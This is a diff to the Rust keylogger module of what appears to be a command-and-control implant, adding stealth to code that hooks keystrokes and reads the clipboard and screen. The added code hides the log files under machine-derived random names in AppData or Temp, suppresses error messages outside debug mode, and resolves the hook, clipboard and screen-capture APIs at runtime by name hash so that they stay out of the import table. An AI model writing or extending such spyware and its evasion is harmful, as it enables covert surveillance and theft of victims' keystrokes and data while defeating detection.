@@ -32,8 +32,54 @@ static STORAGE_DIR: OnceLock<String> = OnceLock::new();
 static CURRENT_LOG_FILE: OnceLock<String> = OnceLock::new();
 
 // Keylogger storage paths, decrypted once and cached (were plain consts).
-fn storage_dir() -> &'static str { STORAGE_DIR.get_or_init(|| aes_str!("./data")) }
-fn current_log_file() -> &'static str { CURRENT_LOG_FILE.get_or_init(|| aes_str!("current.bin")) }
+// Windows stores under %LOCALAPPDATA% (fallback %TEMP%) in a machine-derived
+// subdir + filename: stable per agent install but not a fixed name, and off
+// the CWD (the relative ./data dir landed on the user's Desktop when the
+// agent was launched from there). Linux/macOS keep the legacy ./data layout.
+fn storage_dir() -> &'static str {
+    STORAGE_DIR.get_or_init(|| {
+        #[cfg(target_os = "windows")]
+        { compute_storage_dir() }
+        #[cfg(not(target_os = "windows"))]
+        { aes_str!("./data") }
+    })
+}
+fn current_log_file() -> &'static str {
+    CURRENT_LOG_FILE.get_or_init(|| {
+        #[cfg(target_os = "windows")]
+        { format!("{}.bin", derive_name("log")) }
+        #[cfg(not(target_os = "windows"))]
+        { aes_str!("current.bin") }
+    })
+}
+
+/// Pick the storage base from environment values: LOCALAPPDATA preferred,
+/// TEMP as fallback, None when neither is usable. Pure fn for unit tests.
+pub fn storage_base_from_env(localappdata: Option<String>, temp: Option<String>) -> Option<String> {
+    localappdata.or(temp).filter(|s| !s.is_empty())
+}
+
+/// Machine-derived, random-looking name component (12 lowercase hex chars):
+/// stable per install, uncorrelatable across machines, per-purpose salted.
+/// Consumed by the Windows path policy and the unit tests.
+#[cfg_attr(not(any(target_os = "windows", test)), allow(dead_code))]
+fn derive_name(purpose: &str) -> String {
+    let machine_id = utils::get_persistent_id();
+    let mut hasher = Sha256::new();
+    hasher.update(machine_id.as_bytes());
+    hasher.update(aes_str!("secure_c2_keylogger_path_salt_v1").as_bytes());
+    hasher.update(purpose.as_bytes());
+    let result = hasher.finalize();
+    result[..6].iter().map(|b| format!("{:02x}", b)).collect()
+}
+
+#[cfg(target_os = "windows")]
+fn compute_storage_dir() -> String {
+    match storage_base_from_env(std::env::var("LOCALAPPDATA").ok(), std::env::var("TEMP").ok()) {
+        Some(base) => format!("{}\\{}", base, derive_name("dir")),
+        None => aes_str!("./data"),
+    }
+}
 fn max_file_size() -> u64 { crate::config::config().agent.keylogger_max_bytes }
 fn max_file_age_secs() -> u64 { crate::config::config().agent.keylogger_max_age_secs }
 
@@ -82,7 +128,9 @@ pub fn init_buffer() -> Arc<Mutex<String>> {
 
             // 1. Check Rotation Policy (Size or Time)
             if let Err(e) = check_and_rotate_log() {
-                eprintln!("{}: {}", aes_str!("[-] Rotation Error"), e);
+                if crate::agent::config::load().debug {
+                    eprintln!("{}: {}", aes_str!("[-] Rotation Error"), e);
+                }
             }
 
             // 2. Flush RAM to Disk
@@ -98,7 +146,9 @@ pub fn init_buffer() -> Arc<Mutex<String>> {
 
             if !data_chunk.is_empty() {
                 if let Err(e) = secure_append(&data_chunk) {
-                    eprintln!("{}: {}", aes_str!("[-] Log Flush Error"), e);
+                    if crate::agent::config::load().debug {
+                        eprintln!("{}: {}", aes_str!("[-] Log Flush Error"), e);
+                    }
                 }
             }
         }
@@ -305,40 +355,247 @@ mod windows {
         bmiColors: [u32; 1],
     }
 
-    #[link(name = "user32")]
-    extern "system" {
-        fn SetWindowsHookExA(id: i32, lpfn: unsafe extern "system" fn(i32, WPARAM, LPARAM) -> LRESULT, hmod: HINSTANCE, dwThreadId: u32) -> HHOOK;
-        fn UnhookWindowsHookEx(hhk: HHOOK) -> i32;
-        fn CallNextHookEx(hhk: HHOOK, nCode: i32, wParam: WPARAM, lParam: LPARAM) -> LRESULT;
-        fn PeekMessageA(lpMsg: *mut c_void, hWnd: *mut c_void, min: u32, max: u32, rem: u32) -> i32;
-        fn TranslateMessage(lpMsg: *const c_void) -> i32;
-        fn DispatchMessageA(lpMsg: *const c_void) -> isize;
-        fn GetForegroundWindow() -> *mut c_void;
-        fn GetWindowTextA(hWnd: *mut c_void, lpString: *mut u8, nMaxCount: i32) -> i32;
-        fn MapVirtualKeyA(uCode: u32, uMapType: u32) -> u32;
-        fn GetKeyState(nVirtKey: i32) -> i16;
-        fn GetDC(hWnd: *mut c_void) -> *mut c_void;
-        fn ReleaseDC(hWnd: *mut c_void, hDC: *mut c_void) -> i32;
-        fn OpenClipboard(hWndNewOwner: *mut c_void) -> i32;
-        fn CloseClipboard() -> i32;
-        fn GetClipboardData(uFormat: u32) -> HANDLE;
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn SetWindowsHookExA(id: i32, lpfn: unsafe extern "system" fn(i32, WPARAM, LPARAM) -> LRESULT, hmod: HINSTANCE, dwThreadId: u32) -> HHOOK {
+        type F = unsafe extern "system" fn(i32, unsafe extern "system" fn(i32, WPARAM, LPARAM) -> LRESULT, HINSTANCE, u32) -> HHOOK;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SetWindowsHookExA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(id, lpfn, hmod, dwThreadId) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn UnhookWindowsHookEx(hhk: HHOOK) -> i32 {
+        type F = unsafe extern "system" fn(HHOOK) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"UnhookWindowsHookEx")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hhk) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn CallNextHookEx(hhk: HHOOK, nCode: i32, wParam: WPARAM, lParam: LPARAM) -> LRESULT {
+        type F = unsafe extern "system" fn(HHOOK, i32, WPARAM, LPARAM) -> LRESULT;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CallNextHookEx")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hhk, nCode, wParam, lParam) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn PeekMessageA(lpMsg: *mut c_void, hWnd: *mut c_void, min: u32, max: u32, rem: u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *mut c_void, u32, u32, u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"PeekMessageA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(lpMsg, hWnd, min, max, rem) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn TranslateMessage(lpMsg: *const c_void) -> i32 {
+        type F = unsafe extern "system" fn(*const c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"TranslateMessage")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(lpMsg) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn DispatchMessageA(lpMsg: *const c_void) -> isize {
+        type F = unsafe extern "system" fn(*const c_void) -> isize;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DispatchMessageA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(lpMsg) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn GetForegroundWindow() -> *mut c_void {
+        type F = unsafe extern "system" fn() -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetForegroundWindow")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn GetWindowTextA(hWnd: *mut c_void, lpString: *mut u8, nMaxCount: i32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *mut u8, i32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetWindowTextA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hWnd, lpString, nMaxCount) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn MapVirtualKeyA(uCode: u32, uMapType: u32) -> u32 {
+        type F = unsafe extern "system" fn(u32, u32) -> u32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"MapVirtualKeyA")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(uCode, uMapType) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn GetKeyState(nVirtKey: i32) -> i16 {
+        type F = unsafe extern "system" fn(i32) -> i16;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetKeyState")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(nVirtKey) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn GetDC(hWnd: *mut c_void) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetDC")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hWnd) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn ReleaseDC(hWnd: *mut c_void, hDC: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"ReleaseDC")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hWnd, hDC) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn OpenClipboard(hWndNewOwner: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"OpenClipboard")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hWndNewOwner) }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn CloseClipboard() -> i32 {
+        type F = unsafe extern "system" fn() -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CloseClipboard")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f() }
+    }
+    /// Lazily resolved from user32.dll by name hash (import-table hygiene).
+    unsafe fn GetClipboardData(uFormat: u32) -> HANDLE {
+        type F = unsafe extern "system" fn(u32) -> HANDLE;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"user32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetClipboardData")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(uFormat) }
     }
 
-    #[link(name = "gdi32")]
-    extern "system" {
-        fn CreateCompatibleDC(hdc: *mut c_void) -> *mut c_void;
-        fn CreateCompatibleBitmap(hdc: *mut c_void, nWidth: i32, nHeight: i32) -> *mut c_void;
-        fn SelectObject(hdc: *mut c_void, hgdiobj: *mut c_void) -> *mut c_void;
-        fn BitBlt(hdcDest: *mut c_void, nXDest: i32, nYDest: i32, nWidth: i32, nHeight: i32, hdcSrc: *mut c_void, nXSrc: i32, nYSrc: i32, dwRop: u32) -> i32;
-        fn DeleteObject(ho: *mut c_void) -> i32;
-        fn DeleteDC(hdc: *mut c_void) -> i32;
-        fn GetDIBits(hdc: *mut c_void, hbmp: *mut c_void, uStartScan: u32, cScanLines: u32, lpvBits: *mut c_void, lpbi: *mut BITMAPINFO, uUsage: u32) -> i32;
+    /// Lazily resolved from gdi32.dll by name hash (import-table hygiene).
+    unsafe fn CreateCompatibleDC(hdc: *mut c_void) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"gdi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateCompatibleDC")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hdc) }
+    }
+    /// Lazily resolved from gdi32.dll by name hash (import-table hygiene).
+    unsafe fn CreateCompatibleBitmap(hdc: *mut c_void, nWidth: i32, nHeight: i32) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, i32, i32) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"gdi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"CreateCompatibleBitmap")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hdc, nWidth, nHeight) }
+    }
+    /// Lazily resolved from gdi32.dll by name hash (import-table hygiene).
+    unsafe fn SelectObject(hdc: *mut c_void, hgdiobj: *mut c_void) -> *mut c_void {
+        type F = unsafe extern "system" fn(*mut c_void, *mut c_void) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"gdi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SelectObject")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hdc, hgdiobj) }
+    }
+    /// Lazily resolved from gdi32.dll by name hash (import-table hygiene).
+    unsafe fn BitBlt(hdcDest: *mut c_void, nXDest: i32, nYDest: i32, nWidth: i32, nHeight: i32, hdcSrc: *mut c_void, nXSrc: i32, nYSrc: i32, dwRop: u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, i32, i32, i32, i32, *mut c_void, i32, i32, u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"gdi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"BitBlt")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hdcDest, nXDest, nYDest, nWidth, nHeight, hdcSrc, nXSrc, nYSrc, dwRop) }
+    }
+    /// Lazily resolved from gdi32.dll by name hash (import-table hygiene).
+    unsafe fn DeleteObject(ho: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"gdi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DeleteObject")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(ho) }
+    }
+    /// Lazily resolved from gdi32.dll by name hash (import-table hygiene).
+    unsafe fn DeleteDC(hdc: *mut c_void) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"gdi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"DeleteDC")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hdc) }
+    }
+    /// Lazily resolved from gdi32.dll by name hash (import-table hygiene).
+    unsafe fn GetDIBits(hdc: *mut c_void, hbmp: *mut c_void, uStartScan: u32, cScanLines: u32, lpvBits: *mut c_void, lpbi: *mut BITMAPINFO, uUsage: u32) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *mut c_void, u32, u32, *mut c_void, *mut BITMAPINFO, u32) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"gdi32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GetDIBits")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hdc, hbmp, uStartScan, cScanLines, lpvBits, lpbi, uUsage) }
     }
 
-    #[link(name = "kernel32")]
-    extern "system" {
-        fn GlobalLock(hMem: HANDLE) -> *mut c_void;
-        fn GlobalUnlock(hMem: HANDLE) -> i32;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GlobalLock(hMem: HANDLE) -> *mut c_void {
+        type F = unsafe extern "system" fn(HANDLE) -> *mut c_void;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GlobalLock")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hMem) }
+    }
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn GlobalUnlock(hMem: HANDLE) -> i32 {
+        type F = unsafe extern "system" fn(HANDLE) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"GlobalUnlock")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(hMem) }
     }
 
     static KB_HOOK: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
@@ -681,4 +938,49 @@ pub fn stop() -> String {
     { windows::stop_hook(); aes_str!("Tracking Stopped") }
     #[cfg(not(target_os = "windows"))]
     aes_str!("Not supported")
+}
+
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn storage_base_prefers_localappdata() {
+        let r = storage_base_from_env(Some("C:\\Users\\a\\AppData\\Local".into()), Some("C:\\Temp".into()));
+        assert_eq!(r.as_deref(), Some("C:\\Users\\a\\AppData\\Local"));
+    }
+
+    #[test]
+    fn storage_base_falls_back_to_temp() {
+        let r = storage_base_from_env(None, Some("C:\\Temp".into()));
+        assert_eq!(r.as_deref(), Some("C:\\Temp"));
+    }
+
+    #[test]
+    fn storage_base_none_when_unusable() {
+        assert_eq!(storage_base_from_env(None, None), None);
+        assert_eq!(storage_base_from_env(Some(String::new()), None), None);
+        assert_eq!(storage_base_from_env(Some(String::new()), Some(String::new())), None);
+    }
+
+    #[test]
+    fn derive_name_is_stable_salted_and_shaped() {
+        let a1 = derive_name("dir");
+        let a2 = derive_name("dir");
+        let b = derive_name("log");
+        assert_eq!(a1, a2, "stable per machine");
+        assert_ne!(a1, b, "per-purpose salt differs");
+        assert_eq!(a1.len(), 12);
+        assert!(a1.chars().all(|c| c.is_ascii_hexdigit() && !c.is_uppercase()));
+    }
+
+    #[test]
+    fn non_windows_paths_keep_legacy_layout() {
+        #[cfg(not(target_os = "windows"))]
+        {
+            assert_eq!(storage_dir(), "./data");
+            assert_eq!(current_log_file(), "current.bin");
+        }
+    }
 }
